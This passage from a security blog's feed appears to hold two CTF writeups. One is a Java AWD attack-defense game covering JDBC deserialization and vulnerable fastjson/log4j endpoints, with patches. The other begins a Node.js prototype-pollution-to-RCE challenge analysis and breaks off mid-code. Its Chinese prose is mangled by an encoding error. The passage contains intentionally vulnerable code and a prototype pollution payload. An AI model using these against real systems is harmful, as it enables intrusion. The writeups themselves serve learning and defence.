String.format(<span class="string">&quot;jdbc:mysql://%s:%s/%s?useSSL=false&quot;</span>, ip, port, database);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class.forName(<span class="string">&quot;com.mysql.cj.jdbc.Driver&quot;</span>);</span><br><span class="line">            <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> DriverManager.getConnection(url, username, password);</span><br><span class="line">            <span class="type">Statement</span> <span class="variable">stmt</span> <span class="operator">=</span> conn.createStatement();</span><br><span class="line">            <span class="type">String</span> <span class="variable">sql</span> <span class="operator">=</span> <span class="string">&quot;select &#x27;ok&#x27;&quot;</span>;</span><br><span class="line">            <span class="type">ResultSet</span> <span class="variable">rs</span> <span class="operator">=</span> stmt.executeQuery(sql);</span><br><span class="line">            <span class="keyword">if</span> (rs.next()) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="string">&quot;ok&quot;</span>.equals(rs.getString(<span class="number">1</span>).toString())) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;connect success, &quot;</span> + url;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;connect error, &quot;</span> + url;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="æ¼æ´åˆ©ç”¨-6"><a href="#æ¼æ´åˆ©ç”¨-6" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;database&#x2F;connect mysql jdbcååºåˆ—åŒ–</p><h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><p>æš‚æ— </p><h3 id="patch-6"><a href="#patch-6" class="headerlink" title="patch"></a>patch</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(<span class="params">&#123;<span class="string">&quot;/database/connect&quot;</span>&#125;</span>)</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line">public Object mysql(@RequestParam String ip, @RequestParam String port, @RequestParam String database, @RequestParam String username, @RequestParam String password) &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;connect success, jdbc:mysql://127.0.0.1:3306/admin?useSSL=false&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><h3 id="æºç -7"><a href="#æºç -7" class="headerlink" title="æºç "></a>æºç </h3><p>æ— </p><h3 id="æ¼æ´åˆ©ç”¨-7"><a href="#æ¼æ´åˆ©ç”¨-7" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h3><p>&#x2F;json æ¥å£ç»“åˆæœ‰æ¼æ´çš„ log4jï¼Œfastjsonï¼Œcommons ç¬¬ä¸‰æ–¹ç»„ä»¶</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequestMapping(&quot;/json&quot;)</span></span><br><span class="line">   <span class="meta">@ResponseBody</span></span><br><span class="line">   <span class="keyword">public</span> Object <span class="title function_">json</span><span class="params">(<span class="meta">@RequestBody</span> Object test)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="keyword">return</span> test;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><p>æš‚æ— </p><h3 id="patch-7"><a href="#patch-7" class="headerlink" title="patch"></a>patch</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æœ€ç®€å•çš„åŠæ³•ï¼Œç›´æ¥mavenè·å–æœ€æ–°ç‰ˆæœ¬ï¼Œæ‰“åŒ…jaræˆç¬¬ä¸€ä¸ªç‰ˆæœ¬</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"> <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.83<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-lang3<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.12.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>8.0.30<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.18.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span> </span><br></pre></td></tr></table></figure><h1 id="è¿ç»´"><a href="#è¿ç»´" class="headerlink" title="è¿ç»´"></a>è¿ç»´</h1><p>é˜Ÿå‹çš„è¿ç»´</p><p>ç¬”è®°æ‘˜è¦</p><p>Tomcatï¼Œå¯ä»¥ç¼–ä¸€ä¸ªfilteræˆclassï¼Œæ”¾åˆ°æŒ‡å®šç›®å½•é‡å¯å°±èƒ½åŠ è½½æ‹¦æˆªäº†ï¼›</p><p>Springbootçš„fatjarï¼Œå°è¯•javassistã€äºŒè¿›åˆ¶ä¿®æ”¹ï¼Œæœ€åå‘æºç æ‰ç¼–è¯‘æˆjarä¸Šä¼ ã€‚</p><p>ä¿®å¤åŠ›åº¦è¿‡çŒ›ï¼Œcheckæ²¡è¿‡ã€‚</p><p>* ä»£ç æ¼æ´åªè¦ä¿®æ”¹å¯¹åº”çš„æºç ï¼Œ`mvn package`æ‰“åŒ…å³å¯</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">[INFO] Scanning for projects...</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] ---------------------&lt; code.shellsniper:EasyCloud &gt;---------------------</span><br><span class="line">[INFO] Building EasyCloud 1.4</span><br><span class="line">[INFO] --------------------------------[ jar ]---------------------------------</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-resources-plugin:3.2.0:resources (default-resources) @ EasyCloud ---</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered resources.</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered properties files.</span><br><span class="line">[INFO] Copying 1 resource</span><br><span class="line">[INFO] Copying 46 resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-compiler-plugin:3.8.1:compile (default-compile) @ EasyCloud ---</span><br><span class="line">[INFO] Nothing to compile - all classes are up to date</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-resources-plugin:3.2.0:testResources (default-testResources) @ EasyCloud ---</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered resources.</span><br><span class="line">[INFO] Using &#x27;UTF-8&#x27; encoding to copy filtered properties files.</span><br><span class="line">[INFO] skip non existing resourceDirectory E:\Projects\CTF\202208-EasyCoud\EasyCoud\src\test\resources</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-compiler-plugin:3.8.1:testCompile (default-testCompile) @ EasyCloud ---</span><br><span class="line">[INFO] No sources to compile</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-surefire-plugin:2.22.2:test (default-test) @ EasyCloud ---</span><br><span class="line">[INFO] No tests to run.</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- maven-jar-plugin:3.2.0:jar (default-jar) @ EasyCloud ---</span><br><span class="line">[INFO] Building jar: E:\Projects\CTF\202208-EasyCoud\EasyCoud\target\EasyCloud-1.4.jar</span><br><span class="line">[INFO] </span><br><span class="line">[INFO] --- spring-boot-maven-plugin:2.4.1:repackage (repackage) @ EasyCloud ---</span><br><span class="line">[INFO] Replacing main artifact with repackaged archive</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] BUILD SUCCESS</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line">[INFO] Total time:  1.996 s</span><br><span class="line">[INFO] Finished at: 2022-08-27T20:06:54+08:00</span><br><span class="line">[INFO] ------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">Process finished with exit code 0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;æ‰“äº†ä¸€æ¬¡å†…éƒ¨èµ›AWDï¼Œç¬¬ä¸€æ¬¡åšjavaï¼Œæ”¶è·é¢‡ä¸°ï¼Œç‰¹æ­¤è®°å½•ã€‚&lt;/p&gt;
&lt;h1 id=&quot;æ”»é˜²&quot;&gt;&lt;a href=&quot;#æ”»é˜²&quot; class=&quot;headerlink&quot; title=&quot;æ”»é˜²&quot;&gt;&lt;/a&gt;æ”»é˜²&lt;/h1&gt;&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class</summary>
      
    
    
    
    <category term="writeup" scheme="https://lhhxs.github.io/categories/writeup/"/>
    
    
    <category term="CTF" scheme="https://lhhxs.github.io/tags/CTF/"/>
    
    <category term="AWD" scheme="https://lhhxs.github.io/tags/AWD/"/>
    
  </entry>
  
  <entry>
    <title>\[Balsn CTF 2022\]inenodejs</title>
    <link href="https://lhhxs.github.io/2022/09/09/writeup/[Balsn%20CTF%202022]2linenodejs/"/>
    <id>https://lhhxs.github.io/2022/09/09/writeup/[Balsn%20CTF%202022]2linenodejs/</id>
    <published>2022-09-09T14:28:02.865Z</published>
    <updated>2022-09-10T12:06:40.639Z</updated>
    
    <content type="html"><![CDATA[<p>è¿™é¢˜çš„å‡ºé¢˜äººå»å¹´ä¹Ÿå‡ºäº†0linephpå’Œ1linephpï¼Œç”¨æœ€çŸ­çš„é¢˜ç›®ææœ€éªšçš„æ“ä½œã€‚æƒ³äº†å¾ˆå¤šæ€è·¯ä¸å¾—å…¶è§£ï¼Œæ ¹æ®èµ›åWriteupè¿›è¡Œç ”ç©¶å¤ç°ï¼Œä¸»è¦æ˜¯åˆ†æä¸€ä¸‹è°ƒè¯•çš„è¿‡ç¨‹ã€‚</p><h2 id="env"><a href="#env" class="headerlink" title="env"></a>env</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">â”‚  docker-compose.yml</span><br><span class="line">â”‚  Dockerfile</span><br><span class="line">â”‚  flag</span><br><span class="line">â”‚  readflag.c</span><br><span class="line">â”‚      </span><br><span class="line">â””â”€src</span><br><span class="line">        index.js</span><br><span class="line">        server.js</span><br><span class="line">        usage.js </span><br></pre></td></tr></table></figure><p>é™„ä»¶ç»™äº†æºç ä»¥åŠdockeræ–‡ä»¶ã€‚æ–‡ä»¶è¾ƒå°‘ï¼Œä»readflag.cå¯ä»¥æ¨æµ‹æœ€åéœ€è¦RCEï¼Œå¯ä»¥é€šè¿‡dockerè¿è¡Œç¯å¢ƒã€‚</p><p>server.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/usr/local/bin/node</span></span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">setEncoding</span>(<span class="string">&#x27;utf-8&#x27;</span>);</span><br><span class="line">process.<span class="property">stdin</span>.<span class="title function_">on</span>(<span class="string">&#x27;readable&#x27;</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;HTTP/1.1 200 OK\nContent-Type: text/html\nConnection: Close\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">const</span> json = process.<span class="property">stdin</span>.<span class="title function_">read</span>().<span class="title function_">match</span>(<span class="regexp">/\?(.*?)\ /</span>)?.[<span class="number">1</span>],</span><br><span class="line">    obj = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(json);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`JSON: <span class="subst">$&#123;json&#125;</span>, Object:`</span>, <span class="built_in">require</span>(<span class="string">&#x27;./index&#x27;</span>)(obj, &#123;&#125;));</span><br><span class="line">  &#125;<span class="keyword">catch</span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(<span class="string">&#x27;./usage&#x27;</span>)</span><br><span class="line">  &#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    process.<span class="title function_">exit</span>();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;); </span><br></pre></td></tr></table></figure><p>é€šè¿‡processè·å–è¾“å…¥æµï¼ŒåŒ¹é…è¾“å…¥çš„å­—ç¬¦ä¸²å¹¶è½¬åŒ–ä¸ºJSONæ ¼å¼æ•°æ®ï¼ˆæ³¨æ„è¿™é‡Œä¸èƒ½ä½¿ç”¨ç©ºæ ¼ï¼‰ï¼Œæœ€åé€šè¿‡console.logæ‰“å°ï¼›å¦‚æœè¾“å…¥æ•°æ®ä¸åŒ¹é…ï¼Œåˆ™è¿›å…¥require(â€˜&#x2F;usageâ€™)ï¼Œæœ€åé€€å‡ºè¿›ç¨‹ã€‚</p><p>usage.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Validate your JSON with &lt;a href=&quot;/?&#123;&#125;&quot;&gt;query&lt;/a&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><p>index.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">(<span class="params">O, o</span>) =&gt;</span> (</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">entries</span>(O).<span class="title function_">forEach</span>(</span><br><span class="line">        <span class="function">(<span class="params">[K, V]</span>) =&gt;</span> <span class="title class_">Object</span>.<span class="title function_">entries</span>(V).<span class="title function_">forEach</span>(</span><br><span class="line">            <span class="function">(<span class="params">[k, v]</span>) =&gt;</span> (</span><br><span class="line">                o[K] = o[K] || &#123;&#125;, o[K][k] = v</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    ), o); </span><br></pre></td></tr></table></figure><p>è¿™é‡Œçš„ä»£ç å¯è¯»æ€§è¾ƒå·®ï¼Œæ ¹æ®index.jsï¼Œæœ€ç»ˆä¼šæœ‰<code>(O, &#123;&#125;)</code>ä¸¤ä¸ªå¯¹è±¡ä¼ å…¥å‡½æ•°ï¼Œé€šè¿‡<code>Object.entries</code>è¿ç»­è·å–JSONçš„ä¸¤å±‚é”®å€¼å¯¹ï¼Œæœ€åè¿›è¡Œä¸¤æ¬¡èµ‹å€¼ï¼šâ‘ è‹¥o[K]ä¸å­˜åœ¨ï¼Œåˆ™ç½®ç©ºï¼Œå¦åˆ™å†æ¬¡èµ‹å€¼ï¼›â‘¡å°†vèµ‹å€¼ç»™o[K][k]ã€‚å­˜åœ¨æ¯”è¾ƒæ˜æ˜¾çš„åŸå‹é“¾æ±¡æŸ“ç‚¹ï¼Œå¯ä»¥é€šè¿‡ä¼ å…¥<code>&#123;&quot;__proto__&quot;:&#123;&quot;x&quot;:&quot;y&quot;&#125;&#125;</code>æ±¡æŸ“<code>&#123;&#125;.__proto__</code>ï¼Œè¿›è€Œå½±å“<code>Object.prototype</code>ã€‚</p><p>å‰©ä¸‹çš„å°±æ˜¯è€ƒè™‘å¦‚ä½•RCEäº†ã€‚åœ¨åšé¢˜æ—¶ï¼Œæˆ‘ä»¬å°è¯•å½±å“<code>Object.entries()</code>ä»¥åŠ<code>process</code>ï¼Œæ•ˆæœä¸ç”šç†æƒ³ï¼Œæœ€åçœ‹å®˜æ–¹ç»™çš„<code>require()</code>ï¼Œæ€è·¯ç¡®å®å·§å¦™ã€‚</p><p>å‰ç½®gadgetï¼š<code>[server.js]require(&#39;/usage&#39;)</code> â†’ <code>[helper.js]function require(path)</code> â†’ <code>[loader.js]Module.prototype.require = function(id)</code></p><p><img src="https://oatmeal.vip/wp-content/uploads/2022/09/image-1.png"><br>è·Ÿè¿›<code>Module._load</code>ï¼Œæ ¹æ®å‡½æ•°æè¿°ï¼Œè¯¥å‡½æ•°æœ€ç»ˆçš„ä½œç”¨å°±æ˜¯åŠ è½½æ–‡ä»¶ï¼Œä»è¯¥å‡½æ•°å…¥æ‰‹ï¼Œçœ‹çœ‹è¯¥å‡½æ•°æ˜¯å¦‚ä½•å®ç°çš„ã€‚</p><h2 id="Module-load"><a href="#Module-load" class="headerlink" title="Module._load"></a>Module._load</h2><p>loader</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Check the cache for the requested file.</span></span><br><span class="line"><span class="comment">// 1. If a module already exists in the cache: return its exports object.</span></span><br><span class="line"><span class="comment">// 2. If the module is native: call</span></span><br><span class="line"><span class="comment">//    `BuiltinModule.prototype.compileForPublicLoader()` and return the exports.</span></span><br><span class="line"><span class="comment">// 3. Otherwise, create a new module for the file and save it to the cache.</span></span><br><span class="line"><span class="comment">//    Then have it load  the file contents before returning its exports</span></span><br><span class="line"><span class="comment">//    object.</span></span><br><span class="line"><span class="title class_">Module</span>.<span class="property">_load</span> = <span class="keyword">function</span>(<span class="params">request, parent, isMain</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> relResolveCacheIdentifier;</span><br><span class="line">  <span class="keyword">if</span> (parent) &#123;</span><br><span class="line">    <span class="title function_">debug</span>(<span class="string">&#x27;Module._load REQUEST %s parent: %s&#x27;</span>, request, parent.<span class="property">id</span>);</span><br><span class="line">    <span class="comment">// Fast path for (lazy loaded) modules in the same directory. The indirect</span></span><br><span class="line">    <span class="comment">// caching is required to allow cache invalidation without changing the old</span></span><br><span class="line">    <span class="comment">// cache key names.</span></span><br><span class="line">    relResolveCacheIdentifier = <span class="string">`<span class="subst">$&#123;parent.path&#125;</span>\x00<span class="subst">$&#123;request&#125;</span>`</span>;</span><br><span class="line">    <span class="keyword">const</span> filename = relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">    <span class="keyword">if</span> (filename !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">      <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">        <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>)</span><br><span class="line">          <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">        <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">delete</span> relativeResolveCache[relResolveCacheIdentifier];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">StringPrototypeStartsWith</span>(request, <span class="string">&#x27;node:&#x27;</span>)) &#123;</span><br><span class="line">    <span class="comment">// Slice &#x27;node:&#x27; prefix</span></span><br><span class="line">    <span class="keyword">const</span> id = <span class="title class_">StringPrototypeSlice</span>(request, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> <span class="variable language_">module</span> = <span class="title function_">loadBuiltinModule</span>(id, request);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable language_">module</span>?.<span class="property">canBeRequiredByUsers</span>) &#123;</span><br><span class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">ERR_UNKNOWN_BUILTIN_MODULE</span>(request);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">module</span>.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> filename = <span class="title class_">Module</span>.<span class="title function_">_resolveFilename</span>(request, parent, isMain);</span><br><span class="line">  <span class="keyword">const</span> cachedModule = <span class="title class_">Module</span>.<span class="property">_cache</span>[filename];</span><br><span class="line">  <span class="keyword">if</span> (cachedModule !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">    <span class="title function_">updateChildren</span>(parent, cachedModule, <span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">if</span> (!cachedModule.<span class="property">loaded</span>) &#123;</span><br><span class="line">      <span class="keyword">const</span> parseCachedModule = cjsParseCache.<span class="title function_">get</span>(cachedModule);</span><br><span class="line">      <span class="keyword">if</span> (!parseCachedModule || parseCachedModule.<span class="property">loaded</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">getExportsForCircularRequire</span>(cachedModule);</span><br><span class="line">      parseCachedModule.<span class="property">loaded</span> = <span class="literal">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> cachedModule.<span class="property">exports</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> mod = <span class="title function_">loadBuiltinModule</span>(filename, request);</span><br><span class="line">  <span class="keyword">if</span> (mod?.<span class="property">canBeRequiredByUsers</span> &amp;&amp;</span><br><span class="line">      <span class="title class_">BuiltinModule</span>.<span class="title function_">canBeRequiredWithoutScheme</span>(filename)) &#123;</span><br><span class="line">    <span class="keyword">return</span> mod.<span class="property">exports</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Don&#x27;t call updateChildren(), Module constructor already does.</span></span><br><span class="line">  <span class="keyword">const</span> <span class="variable language_">module</span> = cachedModule || <span class="keyword">new</span> <span class="title class_">Module</span>(filename, parent);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (isMain) &#123;</span><br><span class="line">    process.<span class="property">mainModule</span> = <span class="variable language_">module</span>;</span><br><span class="line">    <span class="variable language_">module</span>.<span class="property">id</span> = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title class_">Module</span>.<span class="property">_cache</span>[filename] = <span class="variable language_">module</span>;</span><br><span class="line">  <span 